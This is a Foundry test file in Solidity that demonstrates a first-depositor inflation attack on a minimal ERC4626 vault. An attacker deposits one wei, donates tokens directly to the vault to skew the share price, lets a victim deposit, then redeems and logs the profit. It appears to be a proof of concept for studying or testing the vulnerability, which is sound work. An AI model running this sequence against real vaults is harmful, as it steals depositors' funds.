// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {MinimalERC4626} from "../src/MinimalERC4626.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MOCK") {
        _mint(msg.sender, 1000000 * 10**18);
    }
}

contract MinimalERC4626Test is Test {
    MinimalERC4626 vault;
    MockERC20 asset;
    address depositor = address(0x100);
    address attacker = address(0x200);
    address victim = address(0x300);

    function setUp() public {
        asset = new MockERC20();
        vault = new MinimalERC4626(asset, "Vault Token", "VAULT");
        
        asset.transfer(depositor, 1000e18);
        asset.transfer(attacker, 10e18 + 1000);
        asset.transfer(victim, 1e18);
        
        vm.startPrank(depositor);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function test_deposit_one_wei() public {
        uint256 attackerInitialBalance = asset.balanceOf(attacker);
        
        vm.startPrank(attacker);
        uint256 firstDepositSize = 1;
        
        vault.deposit(firstDepositSize, attacker);
        
        console.log("After deposit 1 wei - totalSupply:", vault.totalSupply());
        console.log("After deposit 1 wei - totalAssets:", vault.totalAssets());
        console.log("After deposit 1 wei - attacker shares:", vault.balanceOf(attacker));
        console.log();        
        vm.stopPrank();
        
        // Attacker donates 10e18 assets directly to the vault
        vm.startPrank(attacker);
        asset.transfer(address(vault), 10e18);
        vm.stopPrank();
        
        console.log("After donation - totalSupply:", vault.totalSupply());
        console.log("After donation - totalAssets: %e", vault.totalAssets());
        console.log("After donation - attacker shares:", vault.balanceOf(attacker));
        console.log();        

        // Victim deposits 1e18 assets
        vm.startPrank(victim);
        vault.deposit(1e18, victim);
        vm.stopPrank();
        
        console.log("After victim deposit - totalSupply:", vault.totalSupply());
        console.log("After victim deposit - totalAssets: %e", vault.totalAssets());
        console.log("After victim deposit - attacker shares:", vault.balanceOf(attacker));
        console.log("After victim deposit - victim shares:", vault.balanceOf(victim));
        console.log();        

        // Attacker redeems their share to get assets back
        vm.startPrank(attacker);
        uint256 attackerShares = vault.balanceOf(attacker);
        vault.redeem(attackerShares, attacker, attacker);
        vm.stopPrank();
        
        console.log("After attacker redemption - totalSupply:", vault.totalSupply());
        console.log("After attacker redemption - totalAssets: %e", vault.totalAssets());
        console.log("After attacker redemption - attacker shares:", vault.balanceOf(attacker));
        console.log("After attacker redemption - victim shares:", vault.balanceOf(victim));
        console.log("After attacker redemption - attacker asset balance: %e", asset.balanceOf(attacker));
        console.log();
        
        // Calculate attacker profit
        uint256 attackerFinalBalance = asset.balanceOf(attacker);
        int256 attackerProfit = int256(attackerFinalBalance) - int256(attackerInitialBalance);
        console.log("Attacker initial balance: %e", attackerInitialBalance);
        console.log("Attacker final balance: %e", attackerFinalBalance);
        console.log("Attacker profit: %e", attackerProfit);
    }
}
